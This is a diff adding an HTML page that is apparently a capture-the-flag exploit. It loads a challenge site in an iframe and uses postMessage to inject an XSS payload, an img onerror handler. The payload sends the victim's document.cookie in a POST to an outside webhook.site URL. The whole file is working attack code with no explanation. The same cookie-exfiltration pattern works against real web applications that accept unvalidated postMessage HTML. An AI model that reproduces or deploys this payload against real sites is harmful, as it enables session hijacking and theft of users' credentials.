@@ -1,0 +1,32 @@
+
+<!doctype html>
+<html>
+    <body>
+        <iframe
+            id="f"
+            src="https://c0518fcd-a9d5-4180-9db1-20f498156982.offsec.m0lecon.it/preview"
+        ></iframe>
+        <script>
+            const WEBHOOK =
+                "https://webhook.site/b8a61e04-8528-48df-ace4-a1b451703684";
+            const payload = `<img src=x onerror="
+              (async function() {
+                var WEBHOOK = '${WEBHOOK}';
+                
+                await fetch(WEBHOOK, {
+                  method: 'POST',
+                  mode: 'no-cors',
+                  keepalive: true,
+                  body: JSON.stringify(document.cookie)
+                });
+              })();
+            ">`;
+
+            document.getElementById("f").onload = () => {
+                document
+                    .getElementById("f")
+                    .contentWindow.postMessage({ html: payload }, "*");
+            };
+        </script>
+    </body>
+</html>
